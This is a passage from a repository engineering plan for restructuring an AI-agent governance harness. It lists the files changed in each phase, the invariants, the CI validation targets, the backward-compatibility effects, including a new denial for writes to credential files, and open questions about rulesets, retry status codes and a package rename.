split lands before the edit; steps 1 and 2 are the only ones that may run in
parallel with Phase 1.

## Files touched

Protected paths are marked (P); every (P) slice needs the attestation table and
the `infra-reviewed` label. `harness/control-plane/policy-artifact.json` (P) is
regenerated by every slice that edits `governance-policy.json` and is listed
where that happens (DEC-036).

- Phase 0: `harness/node/.governance/decision-log.md` (P),
  `harness/node/agents/GOVERNANCE_SKILL.md` (P), `.github/rulesets/main.json`,
  `harness/shared/tests/test_workflow_contracts.py`,
  `.mango/skills/gate-mutation-proof/SKILL.md` (new, P), `NEXT_STEPS.md`;
  trivia: `harness/control-plane/verify_repository.py` (P), `harness/README.md`,
  `harness/node/scripts/run_vitest.sh`, `docs/specs/god-file-decomposition.md`,
  `harness/node/vitest.config.ts`, `docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md` (moved),
  `harness/shared/tests/test_makefile_contracts.py`, `harness/api_server/tests/test_main.py`.
- Phase 1: `harness/shared/governance/command_actions.py` (P),
  `harness/shared/write_policy.py` (P), `harness/shared/read_policy.py` (P),
  `harness/shared/tool_executors.py`, `harness/shared/orchestrator/dispatcher.py`,
  `harness/shared/mcp_server.py`, `harness/shared/tool_schemas.py`,
  `harness/shared/governance-policy.json` (P), `harness/control-plane/policy-artifact.json` (P),
  `harness/shared/orchestrator/hook_runner.py`, `harness/shared/orchestrator/loop.py`,
  `harness/shared/governance/policy_decision.py` (P), `harness/shared/policy_loader.py` (P),
  `harness/shared/validate_invariants.py` (P), `harness/shared/check_dedup.py` (P),
  `harness/shared/governance/verify_zero_skips.py` (P), the matching tests.
- Phase 2: `.github/workflows/python-package.yml` (P),
  `.github/workflows/scheduled-drift.yml` (P), `.github/dependabot.yml`,
  `requirements-lock.txt`, `Makefile` (P), `pyproject.toml` (P), `Dockerfile`,
  `harness/shared/tests/test_workflow_contracts.py`,
  `harness/shared/tests/test_dockerfile_contract.py` (new),
  `harness/shared/tests/test_makefile_contracts.py`,
  `harness/shared/tests/test_deprecation_shims.py`.
- Phase 3: `harness/shared/policy_loader.py` (P), `harness/shared/langgraph/policy.py` (P),
  `harness/shared/tests/test_import_direction.py`, `docs/specs/retry-parity.md` (new),
  `harness/shared/governance-policy.json` (P), `harness/control-plane/policy-artifact.json` (P),
  `harness/shared/retry_policy.py`, `harness/shared/nemotron_bridge.py`,
  `harness/node/src/ai/nemotron/retry.ts`, `harness/node/src/ai/nemotron/policy.ts`,
  `harness/node/src/ai/nemotron/secret-masker.ts`, `harness/node/src/ai/nemotron/nemotron-client.ts`,
  `harness/node/tests/ai/e2e/retry-parity.test.ts` (new), `harness/node/tests/ai/e2e/mask-parity.test.ts` (new),
  `harness/control-plane/build_policy_bundle.py`, `harness/control-plane/tests/test_build_policy_bundle.py`,
  `harness/shared/tests/test_constant_triage.py`, `harness/shared/governance/verification.py` (P),
  `harness/shared/langgraph/nodes.py` (P), `harness/shared/plan_rules.py` (P),
  `harness/shared/plan_rules_*.py` (new, P), `harness/shared/meta_tools.py`,
  `harness/shared/tests/test_deferred_rigor.py`, `Makefile` (P),
  `.github/workflows/*.yml` (P).
- Phase 4: `harness/node/src/ai/nemotron/stream.ts` (new), `harness/node/src/ai/nemotron/errors.ts` (new),
  `harness/node/src/ai/nemotron/cli.ts`, `harness/node/eslint.config.js`,
  `harness/shared/orchestrator/loop.py`, `harness/shared/mango_mas_orchestrator.py` (P),
  `harness/shared/langgraph/{graph,nodes,state}.py` (P), root gate scripts (P),
  `harness/shared/_deprecation.py` (new), `harness/shared/write_policy.py` (P),
  `harness/shared/autonomous_healing.py`, `harness/shared/lats_optimizer.py`,
  `harness/shared/tool_budget.py`, `harness/shared/governance/broker.py` (P),
  `harness/shared/coverage_scope.py`, `harness/shared/*.sh` (P), `.mango/hooks/*.sh` (P),
  `.claude/hooks/session-start.sh` (P), `harness/shared/tests/test_harness.py`,
  `harness/shared/tests/conftest.py`, `harness/shared/tests/_helpers.py`,
  `harness/shared/tests/_orchestrator_helpers.py` (deleted),
  `harness/shared/tests/regression/conftest.py`, `harness/shared/tests/test_test_quality.py`,
  `harness/api_server/tests/conftest.py`, `harness/control-plane/tests/conftest.py`,
  the test modules named in R-CQ-21, `harness/shared/langgraph/ablation.py` (P),
  `harness/shared/experimental/ablation.py` (new), `harness/shared/tests/test_ablation.py`,
  `harness/shared/tests/test_lats_optimizer.py`,
  `harness/shared/tests/regression/test_e2e_nemotron_triage_regression.py`,
  `harness/node/knip.json`, `harness/node/src/ai/nemotron/index.ts`,
  `harness/node/src/governance/policy-anchor.ts`.
- Phase 5: `.github/workflows/python-package.yml` (P), `.github/rulesets/main.json`,
  `NEXT_STEPS.md`, `harness/shared/tests/test_ci_gate_required_checks.py` (P),
  `harness/shared/tests/test_workflow_contracts.py`, `Makefile` (P),
  `pyproject.toml` (P), `harness/shared/tests/test_marker_liveness.py` (new).
- Phase 6: `docs/specs/control-plane-package.md` (new), `harness/control_plane/` (rename, P),
  `pyproject.toml` (P), `Makefile` (P), `harness/shared/governance-policy.json` (P),
  `harness/control-plane/policy-artifact.json` (P), `docs/reports/archive/` (new),
  `harness/docs/BENCHMARK_REPORT.md` (moved), `harness/CONTRACT.md` (P),
  `harness/shared/tests/test_documentation_truth.py`,
  `harness/shared/tests/test_agent_surface_liveness.py`, `docs/specs/*.md`,
  `docs/specs/SPEC_TEMPLATE.md`, `harness/shared/plan_rules.py` (P),
  `harness/shared/validate_plan.py` (P), `harness/shared/validate_specs.py` (P),
  `harness/shared/tests/test_plan_rules.py`.

## Invariants touched

- INV-1: unchanged in scope; no `.sh` body changes outside `set -euo pipefail`
  and the byte-identity gate; `secrets` still runs in its own job. Proved by
  `make secrets` in CI on every Phase 4 slice.
- INV-2: R-CQ-21 removes skips or annotates them with their waiver's id; R-CQ-24
  adds and removes markers; no waiver widens. Proved by
  `make verify-zero-skips-python` and `verify-zero-skips` on every slice (AC-32).
- INV-3: the remote checker is untouched. Proved by `make remotes`.
- INV-5: R-CQ-23 changes which checks are *required*, never which gates *run*;
  the 3.9 audit still executes as a step. `test_ci_gate_coverage.py` keeps mapping
  every `ci_required_targets` entry to a reachable target.
- INV-6: R-CQ-6 widens the protected set; no bundle digest changes because no
  digested file changes body. C-CQ-2 keeps the `.sh` bodies.
- INV-8, INV-9, INV-10: R-CQ-3, R-CQ-4, R-CQ-5 narrow what reaches the broker and
  the write path; every DENY stays terminal. Proved by the containment suites and
  the three new probes.
- INV-15: R-CQ-22 keeps `lats_enabled: false` as the only switch and moves
  `ablation.py` alongside the code that uses it.
- INV-16: no cognitive-signal path is touched; `pytest -m governance` runs on
  every slice.
- INV-17: this document, the two child specs and the `Status:` rule (R-CQ-28)
  are gated by `make specs`; the tier selection keeps landed plans exempt from
  rules they predate.

## Validation matrix

- `make ci` on every slice: ruff + mypy + vulture + pytest + coverage floors from
  `governance-policy.json → coverage.{lines,branches,per_file}` + lock-check +
  specs + remotes + validate + check-dedup + digest-regen (R-CQ-3 … R-CQ-31, C-CQ-1).
- `make lint-cold` on every slice; `secret-scan` and `dependency-audit` by their
  CI job URLs (C-CQ-3, R-CQ-10).
- `make test-node` and `make lint-node` for R-CQ-13, R-CQ-15, R-CQ-18, R-CQ-22,
  R-CQ-26.
- `make check-dedup` and `pytest harness/shared/tests/test_harness.py -k byte_identical`
  on every Phase 4 slice (R-CQ-19, C-CQ-2).
- `make validate` with and without `ALLOW_GITHUB_CHANGES=1` on every
  protected-path slice (C-CQ-3, R-CQ-1, R-CQ-2, R-CQ-6, R-CQ-26).
- `pytest -W error::DeprecationWarning … -m "not deprecation_shims"` as a recipe
  line, not a sentence (C-CQ-4, R-CQ-11, R-CQ-20, R-CQ-22).
- `make specs` on this document, the child specs and the re-ticked specs
  (R-CQ-25, R-CQ-28, R-CQ-31).
- Negative test per new gate, listed in AC-31: R-CQ-1, R-CQ-3, R-CQ-4, R-CQ-5,
  R-CQ-6, R-CQ-7, R-CQ-8, R-CQ-9, R-CQ-10, R-CQ-11, R-CQ-12, R-CQ-14, R-CQ-16,
  R-CQ-21, R-CQ-24, R-CQ-28 (R-CQ-31).
- Coverage: floors from policy; the baseline on `487870a` is lines 99.29 %,
  branches 97.81 %, 76 files measured (R-CQ-29, R-CQ-30).
- CI cost: run usage on the last green `main` run before Phase 5 and the first
  after, reported in the PR as an estimate with its method (R-CQ-23).

## Backward compatibility

Every import path on `487870a` resolves for one minor release after its
deprecation, and every shim now declares which release removes it (R-CQ-20,
C-CQ-4). `harness.shared.langgraph.ablation` keeps importing silently and warns on
attribute access. `GraphPolicy()` keeps its no-config defaults; they are read from
the mapping they were pinned equal to, so no value changes. `RETRYABLE_HTTP_STATUSES`
stays exported from `nemotron_bridge` with the same members until the child spec
decides the set; the Node predicate changes behaviour for 501 and 505–599 and
that is the point. `classify` returns stricter grades for glob and
process-substitution arguments; a command that used to run under `read` and now
needs `secret_access` or is `destructive` is refused with the existing reasons.
`write_denial_reason` gains one denial class (credential files); no role held a
legitimate write to `.env`. `decide(human_approved=…)` positional callers, if any
exist outside the tree, get a `TypeError`; the two in-tree callers already use the
keyword. `policy_loader` accessors raise `PolicyError` on a present policy missing
a key where they used to return a literal; adopters with a trimmed policy see the
same failure `policy.ts` already gives them. `ExecutionLoop(...)` keyword callers
are unaffected by `LoopConfig`; the facade keeps its signature and builds the
config. The per-stack `.sh` files do not change body. `requirements-lock.txt` stays
the install input; `--require-hashes` rejects only an unhashed line, and `make
lock` regenerates hashes. The `control-plane` rename, if chosen, keeps a shim
directory for one minor release. Removal of `_orchestrator_helpers.py` and
`test_harness.py` affects the test modules named, retargeted in the same PR. The
`security` marker is removed because nothing uses it; a future user re-registers
it. `dependency-audit (3.9)` disappears as a check name; the audit still runs.

## Open questions

1. **Ruleset shape.** Bypass actor, zero approvals with required checks, or a
   second reviewer. Blocks nothing in code; blocks the claim that any gate is
   enforced. The plan recommends zero approvals with the nine checks required
   and code-owner review kept: it is the only shape that enforces CI without a
   second human and without an actor who can skip the checks.
2. **Retryable set.** Python's enumerated five or Node's 5xx range. Decided in the
   `retry-parity` child spec; the plan recommends the enumerated set (a 501 is not
   transient).
3. **NS-3.** The removal clock (R-CQ-20, C-CQ-4) and the shim directory (R-CQ-25)
   both count from a release that does not exist. Settling 2.4.0 or 2.5.0 and
   tagging it is a prerequisite for Phase 4's step 13, not for Phases 1–3.
4. **Runtime cost (item 16).** The shared conversation history and whole-file
   reads are a behavioural change to the orchestrator and need their own spec;
   this plan records the measurement, not the fix.
5. **`control-plane` rename.** The child spec decides; the plan recommends the
   rename, because eight loaders and a third copy of every test-plumbing entry are
   a recurring cost and the shim directory makes it reversible.
